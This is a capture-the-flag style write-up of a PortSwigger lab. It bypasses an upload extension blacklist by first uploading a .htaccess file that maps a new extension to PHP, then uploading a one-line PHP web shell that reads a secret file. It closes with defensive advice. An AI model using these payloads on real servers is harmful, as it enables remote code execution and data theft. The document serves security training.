# Web shell upload via extension blacklist bypass

**Category:** File Upload
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

Blacklisting file extensions has a structural problem that no amount of list maintenance fully solves: it requires the defender to enumerate every dangerous extension in advance, while the attacker only needs to find one the list-writer forgot — or, in this lab's case, exploit the fact that the web server itself can be reconfigured to treat an entirely new extension as executable.

## The Target

The same avatar upload endpoint. This time uploading `exploit.php` is explicitly rejected for its extension, and the response headers identify the backend as Apache.

## The Investigation

The rejection message confirmed `.php` specifically was blacklisted — a targeted block rather than a generic "not an image" response. That, combined with the Apache fingerprint in the response headers, pointed toward a well-known Apache-specific escape hatch: `.htaccess` files. Apache's `mod_php` (or `mod_mime`) can be told to treat arbitrary file extensions as PHP through per-directory configuration, and `.htaccess` is exactly that — a configuration file Apache reads and applies to every request served from the directory it sits in. If the upload endpoint blacklists `.php` but doesn't blacklist `.htaccess` itself, an attacker can redefine what "executable" means in that directory before ever uploading the payload.

## The Exploit

This was a two-step upload. First, we uploaded a file named `.htaccess` — not blacklisted, since it isn't `.php` — containing an Apache directive that maps a made-up extension to the PHP handler:

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

That succeeded and landed in `/files/avatars/`, which is exactly where our next upload needed it, since `.htaccess` rules apply per-directory. Second, we uploaded the actual shell using the newly-whitelisted extension instead of `.php`:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The blacklist never saw `.php` on either request, so both went through. Fetching `GET /files/avatars/exploit.l33t` had Apache apply the `.htaccess` rule we'd planted, execute the file as PHP, and return Carlos's secret — which we submitted to solve the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution is the identical two-request attack: after confirming `.php` is blocked and noting the Apache server header, they replay the `POST /my-account/avatar` request in Burp Repeater, change the filename to `.htaccess`, set the Content-Type to `text/plain`, and replace the body content with the same `AddType application/x-httpd-php .l33t` directive. They then go back to the original PHP-upload Repeater tab and just change the extension from `.php` to `.l33t`, leaving everything else the same. The mapped extension and the mechanism are exactly what we used.

The only divergence is execution path: PortSwigger reuses two Burp Repeater tabs and edits fields by hand between sends; our script issued the same two multipart POSTs back to back through `httpx`. The order and content of the two requests are what matters here, and both approaches send the identical bytes.

## What This Teaches Us

A blacklist is a claim about which extensions are dangerous, and this lab shows that claim can be wrong not because the list is incomplete in the abstract, but because the *server itself* is a source of new danger the list-writer didn't account for — `.htaccess` isn't dangerous by virtue of its extension, it's dangerous because of what Apache does when it finds one. The fix that avoids this entire class of bypass is a whitelist of explicitly permitted extensions combined with disabling `.htaccess` overrides in the upload directory (`AllowOverride None`), so no uploaded file — regardless of name — can ever change how the server interprets its neighbors.
